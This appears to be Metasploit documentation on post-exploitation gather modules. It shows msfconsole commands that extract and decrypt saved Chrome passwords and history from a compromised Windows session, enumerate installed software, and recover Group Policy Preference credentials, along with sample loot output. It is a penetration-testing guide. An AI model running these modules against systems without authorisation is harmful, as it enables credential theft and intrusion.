## Post Modules

Metasploit's post gather modules are useful after a Metasploit session has opened. This guide focuses on Post modules for gathering additional information from a host after a Metasploit session has opened.

Metasploit post modules replace old Meterpreter scripts, which are no longer maintained or accepted by the framework team.

You can search for post gather modules within msfconsole:

```msf
msf6 > search type:post platform:windows name:gather

Matching Modules
================

   #    Name                                                       Disclosure Date  Rank       Check  Description
   -    ----                                                       ---------------  ----       -----  -----------
   0    post/windows/gather/ad_to_sqlite                                            normal     No     AD Computer, Group and Recursive User Membership to Local SQLite DB
   1    post/windows/gather/credentials/aim                                         normal     No     Aim credential gatherer
   ... etc ..
```

### Usage

There are two ways to launch a Post module, both require an existing session.

Within a msf prompt you can use the `use` command followed by the `run` command to execute the module against the required session. For instance to extract credentials from Chrome on the most recently opened Metasploit session:

```msf
msf6 > use post/windows/gather/enum_chrome
msf6 post(windows/gather/enum_chrome) > run session=-1 verbose=true

[*] Impersonating token: 7192
[*] Running as user 'DESKTOP-N3MAG5R\basic_user'...
[*] Extracting data for user 'basic_user'...
[+] Downloaded Web Data to '/Users/user/.msf4/loot/20220422122125_default_192.168.123.151_chrome.raw.WebD_560928.txt'
[-] Cookies not found
[+] Downloaded History to '/Users/user/.msf4/loot/20220422122126_default_192.168.123.151_chrome.raw.Histo_861946.txt'
[+] Downloaded Login Data to '/Users/user/.msf4/loot/20220422122126_default_192.168.123.151_chrome.raw.Login_785667.txt'
[+] Downloaded Bookmarks to '/Users/user/.msf4/loot/20220422122127_default_192.168.123.151_chrome.raw.Bookm_612993.txt'
[+] Downloaded Preferences to '/Users/user/.msf4/loot/20220422122127_default_192.168.123.151_chrome.raw.Prefe_893631.txt'
[*] Found password encrypted with masterkey
[+] Found masterkey!
[+] Decrypted data: url:http://192.168.123.6/ helloworld:157746edfe6b4d369d7e656c00eeb5c8
[+] Decrypted data: url:https://www.example.com/ my_username:my_password_123
[+] Decrypted data saved in: /Users/user/.msf4/loot/20220422122129_default_192.168.123.151_chrome.decrypted_981698.txt
[*] Post module execution completed
msf6 post(windows/gather/enum_chrome) >
```

Or within a Meterpreter prompt use the `run` command, which will automatically set the module's session value:

```msf
msf6 > sessions --interact -1
[*] Starting interaction with 5...

meterpreter > run post/windows/gather/enum_applications

[*] Enumerating applications installed on DESKTOP-N3MAG5R

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 7-Zip 21.07 (x64)                                                   21.07
 Application Verifier x64 External Package                           10.1.19041.685
 ClickOnce Bootstrapper Package for Microsoft .NET Framework         4.8.04162
 DiagnosticsHub_CollectionService                                    16.1.28901
 Docker Desktop                                                      2.2.0.4
 ... etc ..
```

## Useful modules

### Windows GPP Credentials

This module enumerates the victim machine's domain controller and connects to it via SMB. It then looks for Group Policy Preference XML files containing local user accounts and passwords and decrypts them using Microsoft's public AES key. Cached Group Policy files may be found on end-user devices if the group policy object is deleted rather than unlinked

```
use post/windows/gather/credentials/gpp
run session=-1
```
